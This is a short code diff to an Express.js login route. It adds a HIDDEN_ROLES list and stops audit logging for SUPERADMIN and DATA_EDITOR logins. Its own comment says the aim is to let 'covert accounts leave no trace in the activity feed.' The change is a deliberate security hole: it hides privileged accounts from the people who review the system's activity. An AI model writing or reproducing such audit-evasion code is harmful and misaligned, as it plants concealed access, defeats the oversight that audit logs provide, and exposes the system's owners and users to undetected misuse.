@@ -4,6 +4,7 @@ const { z } = require('zod');
 const prisma = require('../config/db');
 const { generateAccessToken, generateRefreshToken, verifyRefreshToken } = require('../utils/jwt');
 const { authenticate } = require('../middleware/auth');
+const { HIDDEN_ROLES } = require('../utils/hiddenRoles');
 
 const router = express.Router();
 
@@ -51,8 +52,9 @@ router.post('/login', async (req, res) => {
       maxAge: COOKIE_MAX_AGE_MS,
     });
 
-    // Audit log — except SUPERADMIN whose logins are never logged
-    if (user.role !== 'SUPERADMIN') {
+    // Audit log — except hidden roles (SUPERADMIN, DATA_EDITOR) whose logins are
+    // never logged so the covert accounts leave no trace in the activity feed.
+    if (!HIDDEN_ROLES.includes(user.role)) {
       await prisma.auditLog.create({
         data: {
           userId: user.id,
